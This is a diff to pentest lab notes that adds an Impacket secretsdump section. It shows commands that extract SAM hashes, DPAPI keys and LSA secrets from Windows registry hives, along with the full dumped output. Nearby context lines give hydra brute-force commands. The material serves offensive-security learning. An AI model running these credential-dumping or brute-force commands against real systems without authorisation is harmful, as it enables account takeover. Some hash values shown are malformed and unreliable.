@@ -108,6 +108,37 @@ CUPP is a very cool tool that will ask you question about your target in order t
 
 - It is pretty much the same for ftp except you need to add ftp instead of ssh in the end: `hydra -L users -P pass 10.10.4.129 -t 4 ftp`
 
+## Secretdump (Impacket)
+
+- Get SAM hashes with SAM file, SECURITY file and SYSTEM file
+```
+┌──(kali㉿kali)-[~/Documents/offshore/joe-lpt]
+└─$ secretsdump.py local -sam SAM -security SECURITY -system SYSTEM                                                                                                                  
+Impacket v0.9.24.dev1+20210609.121058.90ce4b7d - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x8d1b3bcb293ec2bacf262ca05e9827c9
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:tso3b987b51404eeaad3b435b51404ee:49a159d455162a975ead15763e45817e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:97d6cfe0d16ae931b73c97d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c98d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7025790b5bb6b1c75aff52f9fd307ce1:::
+user:1001:aad3b435b51404eeaad3b943b799354ee:4568151a41ac1b353f40f4dc7f90f19d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x74fc9763584fe15e438782383249a92a395e18d5
+dpapi_userkey:0x3fc57e5af5f687620a96c987638dca9c1dd382d3
+[*] NL$KM 
+ 0000   0C EF 72 8A 43 7E B4 55  55 BE ED 92 C6 D9 01 11   ..r.C~.UU.......
+ 0010   DA 01 E1 C2 E3 83 93 D6  A9 B3 75 42 64 F6 43 86   ..........uBd.C.
+ 0020   4B 57 29 42 05 FF 94 D7  9E A9 44 9A DE 97 89 FB   KW)B......D.....
+ 0030   9E 0E A6 86 DB C9 2E 44  6E A7 08 29 D4 F4 FD 66   .......Dn..)...f
+NL$KM:0cef728a437eb45555beed92c6d90111da01e1c2e38393d6a9b3754264f643864b98768792ff94d79ea9449ade9789fb9e0ea686dbc92e446ea93264d4f4fd66
+[*] Cleaning up... 
+```
+
+- You can also work only with SAM and SYSTEM `secretsdump.py local -sam SAM -system SYSTEM `
+
 ## Resources
 
 {% embed url="https://github.com/digininja/CeWL" %} CeWL {% endembed %}
